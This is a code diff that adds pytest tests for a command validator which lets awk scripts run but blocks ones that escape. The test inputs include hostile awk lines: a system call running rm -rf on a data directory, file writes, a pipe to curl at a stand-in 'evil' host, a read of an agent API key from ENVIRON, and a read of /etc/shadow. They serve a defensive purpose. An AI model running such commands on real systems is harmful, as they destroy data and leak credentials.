@@ -312,3 +312,60 @@ def test_db_statements_still_strict_after_scoping_fix(cmd: str, args: list[str],
     ok, reason = validate_command(cmd, args)
     assert ok is False, f"{cmd} {' '.join(args)} phai bi chan"
     assert why in reason
+
+
+# ---------------------------------------------------------------------------
+# awk: chạy được, chỉ chặn khi THẬT SỰ ghi/chạy lệnh khác
+# ---------------------------------------------------------------------------
+
+@pytest.mark.parametrize("script,files", [
+    ("{print $1}", ["/var/log/syslog"]),
+    ("NR>1{sum+=$3} END{print sum}", ["/var/log/syslog"]),
+    ('/ERROR/{c++} END{printf "%d\\n", c}', ["/var/log/syslog"]),   # pattern có dấu /
+    ("{if ($5 > 100) print $0}", ["/var/log/syslog"]),              # `>` là so sánh
+])
+def test_awk_normal_scripts_run(script: str, files: list[str]) -> None:
+    """Cú pháp awk bình thường phải CHẠY.
+
+    `$` nằm trong regex metachar nên quét cả dòng làm mọi chương trình awk đời thực
+    chết — awk có trong catalogue nhưng không bao giờ chạy được. Và pattern awk dùng
+    `/` làm dấu phân cách (`/ERROR/{...}`) nên bộ kiểm đường dẫn tưởng script là path
+    rồi từ chối với lý do `path_out_of_scope` — vô nghĩa với người đọc log.
+    """
+    from pkg.diagnostics.validator import validate_command
+
+    ok, reason = validate_command("awk", [script, *files])
+    assert ok is True, f"awk {script!r} bi chan oan: {reason}"
+
+
+@pytest.mark.parametrize("script,why", [
+    ('BEGIN{system("rm -rf /data")}', "awk_system_call_blocked"),
+    ('{print > "/tmp/out"}', "awk_file_write_blocked"),
+    ('{print >> "/var/log/x"}', "awk_file_write_blocked"),
+    ('{print | "curl http://evil/x"}', "awk_pipe_to_command_blocked"),
+    ('BEGIN{print ENVIRON["OMNI_AGENT_API_KEY"]}', "awk_environ_read_blocked"),
+    ('BEGIN{while((getline l < "/etc/shadow")>0) print l}', "awk_getline_"),
+])
+def test_awk_only_writes_and_escapes_are_blocked(script: str, why: str) -> None:
+    """Bốn cửa duy nhất awk tác động ra ngoài tiến trình của nó, cộng đọc env.
+
+    Chủ hệ thống yêu cầu awk được chạy, chỉ cấm khi THẬT SỰ sửa đổi dữ liệu khách.
+    Nên không liệt kê trắng cú pháp (awk là ngôn ngữ đầy đủ, bất khả thi) mà chặn
+    đúng các cửa: `system()`, pipe tới lệnh ngoài, ghi file, và `getline <` đọc file
+    ngoài phạm vi. `ENVIRON[]` chặn thêm vì nó đọc khoá API của chính agent.
+    """
+    from pkg.diagnostics.validator import validate_command
+
+    ok, reason = validate_command("awk", [script, "/var/log/syslog"])
+    assert ok is False, f"{script!r} phai bi chan"
+    assert why in reason
+
+
+def test_awk_data_files_still_scope_checked() -> None:
+    """Miễn quét cho SCRIPT không được làm lỏng kiểm FILE DỮ LIỆU."""
+    from pkg.diagnostics.validator import validate_command
+
+    for path in ("/var/lib/mysql/ibdata1", "/home/khach/orders.csv"):
+        ok, reason = validate_command("awk", ["{print $1}", path])
+        assert ok is False, path
+        assert "hard_denied_path" in reason
